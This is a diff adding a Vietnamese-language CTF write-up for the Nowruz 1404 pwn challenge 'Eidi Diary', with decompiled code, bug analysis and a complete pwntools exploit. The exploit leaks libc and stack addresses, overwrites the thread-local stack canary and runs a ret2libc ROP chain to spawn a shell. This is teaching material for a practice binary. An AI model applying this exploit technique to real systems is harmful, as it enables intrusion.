@@ -315,4 +315,226 @@ VSL{fake}
 $  
 ```
 
-## 
+## Eidi Diary
+
+![Description](/img/2025/Nowruz1404CTF/{4277A0E8-9768-46D2-9DD0-CC92A42A6CFE}.png)
+
+Bài này mình không làm kịp trong thời gian cuộc thi, vừa xong thì vừa end game nên hơi tiếc.
+
+### Checksec
+
+```bash
+┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Eidi Diary]
+└─$ checksec chall
+[*] '/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Eidi Diary/chall'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+### Source code
+
+- **main**
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+0h] [rbp-120h] BYREF
+  int i; // [rsp+4h] [rbp-11Ch]
+  FILE *stream; // [rsp+8h] [rbp-118h]
+  char s[264]; // [rsp+10h] [rbp-110h] BYREF
+  unsigned __int64 v8; // [rsp+118h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  while ( 1 )
+  {
+    puts("Eidi diary");
+    puts("1 - Add Eidi");
+    puts("2 - View Eidis");
+    puts("3 - Exit");
+    printf("Enter your choice: ");
+    if ( (unsigned int)__isoc99_scanf("%d", &v4) != 1 )
+      return 1;
+    getchar();
+    if ( v4 == 1337 )
+    {
+      stream = fopen("/proc/self/maps", "r");
+      while ( fgets(s, 256, stream) )
+        printf("%s", s);
+      fclose(stream);
+      exit(0);
+    }
+    if ( v4 > 1337 )
+      goto LABEL_21;
+    if ( v4 == 3 )
+    {
+      puts("Exiting!");
+      for ( i = 0; i < eidiCount; ++i )
+        free(*((void **)&eidiList + 3 * i));
+      exit(0);
+    }
+    if ( v4 > 3 )
+    {
+LABEL_21:
+      puts("Invalid choice. Try again.");
+    }
+    else if ( v4 == 1 )
+    {
+      addEidi();
+    }
+    else
+    {
+      if ( v4 != 2 )
+        goto LABEL_21;
+      viewEidis();
+    }
+  }
+}
+```
+
+- **addEidi**
+
+```c
+unsigned __int64 addEidi()
+{
+  unsigned __int16 v0; // ax
+  __int64 v2; // [rsp+8h] [rbp-A8h] BYREF
+  __int64 v3; // [rsp+10h] [rbp-A0h] BYREF
+  char *v4; // [rsp+18h] [rbp-98h]
+  char buf[136]; // [rsp+20h] [rbp-90h] BYREF
+  unsigned __int64 v6; // [rsp+A8h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  printf("Enter the length of the giver's name: ");
+  __isoc99_scanf("%lu", &v2);
+  getchar();
+  printf("Enter the name of the giver: ");
+  v0 = 256;
+  if ( (unsigned __int16)v2 <= 0x100u )
+    v0 = v2;
+  read(0, buf, v0);
+  buf[v2] = 0;
+  v4 = strdup(buf);
+  printf("Enter the amount received: ");
+  __isoc99_scanf("%lf", &v3);
+  *((_QWORD *)&eidiList + 3 * eidiCount) = v4;
+  qword_4050[3 * eidiCount] = v3;
+  *((_WORD *)&unk_4048 + 12 * eidiCount++) = strlen(buf);
+  puts("Eidi recorded successfully!");
+  return v6 - __readfsqword(0x28u);
+}
+```
+
+- **viewEidis**
+
+```c
+int viewEidis()
+{
+  int result; // eax
+  int i; // [rsp+Ch] [rbp-4h]
+
+  if ( !eidiCount )
+    return puts("No Eidis recorded yet.");
+  puts("List of Eidis Received:\n");
+  for ( i = 0; ; ++i )
+  {
+    result = eidiCount;
+    if ( i >= eidiCount )
+      break;
+    printf("%d. Amount: %.2lf From: ", i + 1, *(double *)&qword_4050[3 * i]);
+    write(1, *((const void **)&eidiList + 3 * i), *((unsigned __int16 *)&unk_4048 + 12 * i));
+  }
+  return result;
+}
+```
+
+### Analysis
+
+Bài này được cấp **libc** nên mình nghĩ ngay là một bài **ret2libc**. Tuy nhiên **Canary** lại bật, nên mình đi tìm cách để leak các địa chỉ cần thiết trong chương trình.
+
+Ở trong hàm `addEidi()`, mình chú ý thấy đoạn code cho phép người dùng nhập vào độ dài của biến `buf`, sau đó ở vị trí đó sẽ được đặt thành giá trị **null ('\x00')**. -> Sau đó, **strdup()** sẽ copy giá trị của biến `buf` vào trong `v4`.
+  > Ở đây, điều lưu ý là hàm `strdup()` sẽ copy cho đến khi gặp phải ký tự **null** => Ở đây mình có thể tận dụng để leak các địa chỉ trên stack.
+
+Hàm `viewEidis()` sẽ in ra các eidi mà mình đã thêm vào. Tận dụng điều này và phát hiện ở trên, mình có thể leak được các giá trị như **libc address** và **stack buffer**.
+
+Đồng thời tận dụng việc byte cuối do người dùng nhập vào biến `v2` sẽ được gán bằng 0 (null) để có thể ghi đè giá trị của **Canary** thành giá trị mong muốn. Sau đó chỉ cần kết hợp tất cả dữ kiện thu được để thực hiện **ret2libc** để lấy được shell => Get flag
+
+### Solution
+
+```python
+from pwn import *
+
+p = process("./chall_patched")
+elf = ELF("./chall_patched", checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+
+def addEidi(size, name, amount):
+    p.sendlineafter(b"choice: ", b"1")
+    p.sendlineafter(b"giver's name: ", str(size).encode())
+    p.sendafter(b"giver: ", name)
+    p.sendlineafter(b"received: ", str(amount).encode())
+    
+
+def viewEidis():
+    p.sendlineafter(b'choice: ', b'2')
+    
+# Phase 1: Leak libc
+
+addEidi(30, b"a" * 8, 0)
+viewEidis()
+
+p.recvuntil(b"a" * 8)
+leak = u64(p.recv(6).ljust(8, b"\x00"))
+libc.address = leak - 0x219380
+info(f"Libc base: {hex(libc.address)}")
+tls = libc.address - 0x2898  # TLS of canary
+
+# Phase 2: Leak stack buffer
+
+addEidi(22, b"a" * 16, 0)
+viewEidis()
+p.recvuntil(b"a" * 16)
+leak = u64(p.recv(6).ljust(8, b"\x00")) - 0x40
+
+info(f"Leak stack: {hex(leak)}")
+
+# Phase 3: Overwrite canary
+
+for i in range(1, 8):
+    offset = tls - leak + i
+    payload = b'A' * 136 + b'\x00' + b'\x00' * i
+    info(f"Payload: {payload}")
+    addEidi(offset, payload, 0)
+    p.recvline()
+
+# Phase 4: Exploit get shell
+
+payload = flat(
+    b"A" * 136, # buffer
+    p64(0), # canary
+    p64(0), # save rbp
+    p64(libc.address + 0x000000000002882f), # rop: ret
+    p64(libc.address + 0x000000000010f75b), # rop: pop rip ; ret
+    p64(next(libc.search(b"/bin/sh"))), # /bin/sh
+    p64(libc.sym.system) # system call
+)
+
+addEidi(256, payload, 0)
+
+p.interactive()
+```
+
+![POC](/img/2025/Nowruz1404CTF/{DA5F52FD-A05D-4BFD-9D4D-27301B0CD729}.png)
+
+## Pwn/gogogo
+
+![Description](/img/2025/Nowruz1404CTF/{4199A921-43AE-4A86-900D-09DB93D22392}.png)
+
+Bài này dạng lạ quá nên mình chưa biết solve kiểu gì. Có thời gian mình sẽ tìm writeup và nghiên cứu lại.
